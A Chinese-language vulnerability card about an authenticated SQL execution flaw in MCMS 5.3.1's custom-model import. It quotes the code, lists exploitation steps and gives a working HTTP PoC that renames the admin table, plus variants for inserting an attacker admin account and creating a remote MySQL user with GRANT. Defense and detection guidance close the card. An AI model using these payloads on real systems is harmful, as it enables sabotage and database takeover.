---
id: web-generic-sqli-mcms-importmodel-sql-keyword-blacklist-bypass
title: MCMS 5.3.1 自定义模型导入 importModel 的 sql 字段只黑名单 7 个关键字：RENAME/CREATE/REPLACE 未拦截导致任意 SQL 执行
type: scenario
domain: web
path: web/generic/sqli
technique: mcms-importmodel-sql-statement-blacklist-bypass
aliases:
- MCMS importJson SQL
- importModel excuteSql
- RENAME TABLE manager
- 模型导入任意 SQL
- MCMS 自定义模型注入
- MDIY_MODEL excuteSql
tags:
- java
- mcms
- sqli
- sql-execution
- blacklist-bypass
- admin
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
affected_versions: MCMS 5.3.1（原文审计版本）
verification:
  verified_by: verifier-V517
  verified_at: '2026-11-11T12:12:03+08:00'
  notes: 已对照原文与全部 14 张图核对（因 img_small 部分编号与 img 原图错位，均直接 Read 原图为准，无读取失败）：06 ModelAction#importJson（@PostMapping("/importJson")、@RequiresPermissions("mdiy:model:importJson")、ModelEntity→ModelJsonBean→modelBiz.importModel）、07 ModelBizImpl#importModel 反编译（replace {model}→MDIY_MODEL_、trim().split(";")、7 关键字 INSERT/SELECT/UPDATE/DELETE/DROP/ALTER/TRUNCATE 带尾空格黑名单、modelDao.excuteSql）、08 IBaseDao#excuteSql 接口、09 Mapper select excuteSql statementType=STATEMENT 中 ${sql}、10 manager 表及数据（msopen）、11 rename 后 xxxxxxxx 表仍含原数据、12/13 create table manager 后 16 张表且 manager 为空、14 后台登录『SQL异常』。卡片一句话结论/原理/步骤/PoC（rename test01、create table test012）与截图一致；完整 URL 原文未直接展示，卡片已注明按 Action 映射推断。affected_versions『MCMS 5.3.1（原文审计版本）』准确（原文『在审MCMS(5.3.1)时』），非误导。dedup：候选均 related/new（同产品其它 ${} 注入入口不同），非同链。skipped：NginxWebUI reload 命令注入已有 verified 卡 web-java-rce-nginxwebui-reload-check-nginxexe-rce 覆盖同 sink，本篇 calc.exe 改名 .zip 上传再经 nginxExe 执行属载荷投递变体，跳过可接受。卡无需修正，已 verified。
---

## 一句话结论

MCMS 5.3.1 后台「自定义模型导入」把 modelJson 里的 `sql` 字段按 `;` 拆分后，只检查是否包含 `INSERT /SELECT /UPDATE /DELETE /DROP /ALTER /TRUNCATE `（带尾空格、忽略大小写），不含就交给 `IBaseDao.excuteSql` 的 `${sql}` 直接执行；由于 `RENAME`、`CREATE`、`REPLACE`、`CREATE USER/GRANT` 都不在黑名单，管理员登录后即可执行任意 SQL——原文用 `rename table manager to xxxxxxxx` 把管理员表改名，导致后台登录报 SQL 异常，也演示了 `create table manager(...)` 新建表。

## 原理

- 入口：`net.mingsoft.mdiy.action.ModelAction#importJson`（`@PostMapping({"/importJson"})`，`@RequiresPermissions("mdiy:model:importJson")`）接收 `ModelEntity`，取 `modelJson` 交给 `net.mingsoft.mdiy.biz.impl.ModelBizImpl#importModel`。按 Action 映射推断完整路径为 `/ms/mdiy/model/importJson`（原文未展示完整 URL）。
- `importModel` 处理逻辑（反编译截图）：
  ```java
  if (StringUtils.isNotBlank(modelJsonBean.getSql())) {
      String[] formSqls = modelJsonBean.getSql()
              .replace("{model}", "MDIY_MODEL_").trim().split(";");
      for (String sql : formSqls) {
          if (!StringUtils.isBlank(sql) && !StrUtil.containsAnyIgnoreCase(sql,
                  new CharSequence[]{"INSERT ", "SELECT ", "UPDATE ", "DELETE ",
                                    "DROP ", "ALTER ", "TRUNCATE "})) {
              this.modelDao.excuteSql(sql);
          }
      }
  }
  ```
  每次导入会先把模型信息（title/tableName 等）写入 `mdiy_model`，所以重复发包要换 `title`/`tableName`，否则会因模型已存在而失败。
- Mapper：`<select id="excuteSql" parameterType="String" statementType="STATEMENT">${sql}</select>` —— `${}` 是字符串拼接且 `STATEMENT` 模式直接执行，不做预编译。
- 黑名单只是 7 个带尾空格的 SQL 关键字，属于「黑名单枚举不完整」：`RENAME TABLE`、`CREATE TABLE`、`REPLACE INTO`、`CREATE USER`、`GRANT`、`SET`、`CALL` 等均未覆盖；分号拆分后每条语句单独检查，多语句可依次执行。
- 危害：`RENAME TABLE manager TO xxxxxxxx` 直接破坏后台登录（管理员表消失，登录报 SQL 异常）；`CREATE TABLE manager(...)` 可重建空表；`REPLACE INTO manager ...` 可插入自定义管理员；`CREATE USER/GRANT` 可添加可远程连接的 MySQL 账号（原文建议的扩展思路）。

## 触发条件

- 目标为 MCMS 5.3.1（原文审计版本），自定义模型功能可用。
- 攻击者拥有后台账号且具备 `mdiy:model:importJson` 权限（默认超级管理员满足）。
- 数据库账号有执行 DDL/DCL 的权限（默认安装通常具备）。
- 需要每次请求使用不同的 `title`/`tableName`，避免模型记录重复。

## 利用步骤

1. 登录 MCMS 后台。
2. 向 `/ms/mdiy/model/importJson` POST `modelType=cms` 与 `modelJson`，其中 `sql` 填未列入黑名单的语句。
3. 破坏性验证（原文）：`sql=rename table manager to xxxxxxxx`，之后 `show tables` 可见表被改名，后台登录报「SQL 异常」。
4. 接管/扩展：`create table manager(...)` 重建表结构，或用 `replace into manager(...)` 插入管理员；也可 `CREATE USER 'x'@'%' IDENTIFIED BY '...'` + `GRANT ALL ON *.* TO 'x'@'%'` 获得数据库远程访问。
5. 刷新/重新登录验证影响。

## PoC

```http
POST /ms/mdiy/model/importJson HTTP/1.1
Host: target
Cookie: <后台会话>
Content-Type: application/x-www-form-urlencoded

modelType=cms&modelJson={"html":"<template id=\"custom-model\"></template>","title":"test01","script":"","sql":"rename table manager to xxxxxxxx","tableName":"test01"}
```

重建管理员表（原文截图请求）：

```json
{"title":"test012","script":"","sql":"create table manager(id int, ROLE_IDS int, people_id int, manager_admin Varchar(255), manager_name Varchar(255), manager_nickname Varchar(255), manager_password Varchar(255))","tableName":"test012"}
```

```text
mysql> show tables;
... xxxxxxxx
mysql> select * from manager;   -- 若已重建则为空表，后台登录异常
```

## 变体与关联

- 变体：`REPLACE INTO manager(...) VALUES(...)` 写入攻击者管理员（密码按 MCMS 的哈希规则构造）；或 `CREATE USER`/`GRANT` 开数据库外联。
- 变体：关键字黑名单可用注释、换行、大小写、反引号等继续改造（如 `REN/**/AME`），但本卡利用的是「未枚举语句类型」，不需要变形。
- 关联：[[web-generic-sqli-mcms-formdata-querydata-orderby]]、[[web-generic-sqli-mcms-mdiy-dict-orderby-injection]]、[[web-generic-sqli-mcms-querybysql-wheres-key-fieldname]]——同产品其它 SqlMap `${}` 注入入口。
- 关联：[[web-java-component-mcms-dual-route-prefix-auth-bypass]]、[[web-java-component-mcms-fileaction-upload-blacklist-jspx-ads]]——MCMS 的鉴权/上传类问题。

## 检测与防御

- 防御：模型导入禁止接受原始 SQL；只允许预定义的 DDL 模板与参数化字段，或直接移除该功能。
- 防御：`excuteSql` 改为白名单语句类型（且解析后比对 AST），禁用 `${sql}` + `statementType="STATEMENT"`。
- 防御：数据库账号最小权限，应用账号不应具备 `RENAME`/`GRANT`/`CREATE USER` 等 DDL/DCL 权限；后台导入功能加二次确认与审计。
- 检测：审计 `mdiy_model` 导入请求的 `sql` 字段出现 `RENAME`、`CREATE`、`REPLACE`、`GRANT`、`CREATE USER` 等未列入旧黑名单的关键字；监控 `manager` 等核心表被改名/重建及后台登录 SQL 异常突增。
- 检测：数据库审计日志中出现来自 Web 应用的 DDL/DCL 语句（RENAME TABLE、CREATE USER、GRANT）。
